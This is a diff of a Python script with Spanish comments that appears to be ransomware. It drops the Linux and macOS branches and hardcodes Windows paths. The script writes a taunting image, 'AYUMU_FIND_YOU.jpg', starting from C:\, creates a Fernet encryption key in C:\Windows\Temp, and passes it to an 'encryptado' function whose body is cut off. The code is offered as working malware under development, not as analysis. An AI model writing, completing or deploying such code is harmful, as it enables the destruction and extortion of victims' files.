@@ -37,12 +37,9 @@ def download_and_multiply_img():
 
     # Lo de arriba son los bytes de la foto para que sin usar internet ya se tenga la foto
     
-    if platform.system() == "Windows":
-        ruta = "C:\\"
-    elif platform.system() == "Linux":
-        ruta = "/"
-    else:
-        print("Chupala usario de Macos")
+   
+    ruta = "C:\\"
+
 
     
     with open("AYUMU_FIND_YOU.jpg" ,"wb") as P1:
@@ -69,30 +66,11 @@ def download_and_multiply_img():
             pass
     
 def key():
-    sistema_operativo = platform.system()
-
-    #Todo esto de aca verifica que sistema se usa para guardar la llave
     
-    if sistema_operativo == "Linux":
-        Rutas = ["/home/Desktop" , "/home/Escritorio"] #Si quiere guardar mejor la llave en linux puede cambiar estas rutas de aca
+    with open("C:\\Windows\\Temp\\key.key" , "wb")as llave:
+        llave.write(Fernet.generate_key())
         
-        for i in rutas: 
-            if os.path.exists(i):
-                ruta_p = f"{i}/key.key"
-                with open(ruta_p , "wb")as llave:
-                    llave.write(Fernet.generate_key())
-            else:
-                pass
-        return open(ruta_p , "rb").read() 
-        
-    elif sistema_operativo == "Windows":    
-        with open("C:\\Windows\\Temp\\key.key" , "wb")as llave:
-            llave.write(Fernet.generate_key())
-        
-        return open("C:\\Windows\\Temp\\key.key" , "rb").read()
-        
-    else:
-        print("Usuario de mac")
+    return open("C:\\Windows\\Temp\\key.key" , "rb").read()
 
 
 def encryptado(path , key):
